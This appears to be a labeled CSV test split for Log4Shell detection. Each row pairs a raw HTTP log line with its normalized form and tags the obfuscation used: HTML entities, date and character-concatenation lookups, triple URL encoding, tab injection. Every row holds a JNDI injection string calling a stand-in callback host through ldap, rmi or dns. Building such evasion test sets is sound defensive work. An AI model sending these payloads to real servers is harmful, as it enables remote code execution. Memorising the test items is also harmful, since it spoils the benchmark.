id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-002502,2026-05-17,adversarial_evasion,GET /search?q=${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://lab-callback.example.org/html-hex} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,html_entity_jndi,path,adversarial_evasion_test,critical
LS-002503,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#x6A;ndi:ldap://lab-callback.example.org/html-hex},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/html-hex},1,log4shell,html_entity_jndi,body,adversarial_evasion_test,critical
LS-002504,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-002505,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-002506,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://lab-callback.example.org/html-hex} | method: get | host: app.local | path: /metrics,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-002507,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://lab-callback.example.org/html-hex},request from user-agent: ${jndi:ldap://lab-callback.example.org/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002508,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${&#x6A;ndi:ldap://lab-callback.example.org/html-hex},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://lab-callback.example.org/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-002509,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-002510,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-002511,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | Method: GET | Host: app.local | Path: /,request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | method: get | host: app.local | path: /,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-002512,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002513,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-002514,2026-05-17,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,semantic_lookup_jndi,path,adversarial_evasion_test,critical
LS-002515,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,log4shell,semantic_lookup_jndi,body,adversarial_evasion_test,critical
LS-002516,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-002517,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-002518,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | method: get | host: app.local | path: /metrics,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-002519,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002520,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-002521,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://lab-callback.example.org/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-002522,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://lab-callback.example.org/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-002523,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:rmi://lab-callback.example.org/full-rmi} | method: get | host: app.local | path: /metrics,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-002524,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi},request from user-agent: ${jndi:rmi://lab-callback.example.org/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-002525,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:rmi://lab-callback.example.org/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-002526,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:rmi://lab-callback.example.org/full-rmi} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,lookup_character_concat,path,adversarial_evasion_test,critical
LS-002527,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi},post /search http/1.1 host: app.local body: query=${jndi:rmi://lab-callback.example.org/full-rmi},1,log4shell,lookup_character_concat,body,adversarial_evasion_test,critical
LS-002528,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://lab-callback.example.org/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-002529,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://lab-callback.example.org/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-002530,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:rmi://lab-callback.example.org/full-rmi} | method: get | host: app.local | path: /login,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-002531,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi},request from user-agent: ${jndi:rmi://lab-callback.example.org/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-002532,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://lab-callback.example.org/full-rmi},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:rmi://lab-callback.example.org/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-002533,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://lab-callback.example.org/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-002534,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://lab-callback.example.org/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-002535,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:dns://lab-callback.example.org/triple-test} | method: get | host: app.local | path: /home,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-002536,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://lab-callback.example.org/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-002537,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D,request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:dns://lab-callback.example.org/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-002538,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:dns://lab-callback.example.org/triple-test} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,triple_url_encoded,path,adversarial_evasion_test,critical
LS-002539,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D,post /search http/1.1 host: app.local body: query=${jndi:dns://lab-callback.example.org/triple-test},1,log4shell,triple_url_encoded,body,adversarial_evasion_test,critical
LS-002540,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://lab-callback.example.org/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-002541,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://lab-callback.example.org/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-002542,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:dns://lab-callback.example.org/triple-test} | method: get | host: app.local | path: /,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-002543,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://lab-callback.example.org/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-002544,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-test%25257D,request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:dns://lab-callback.example.org/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-002545,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://lab-callback.example.org/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://lab-callback.example.org/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-002546,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://lab-callback.example.org/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://lab-callback.example.org/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-002547,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://lab-callback.example.org/tab-protocol} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi: ldap://lab-callback.example.org/tab-protocol} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
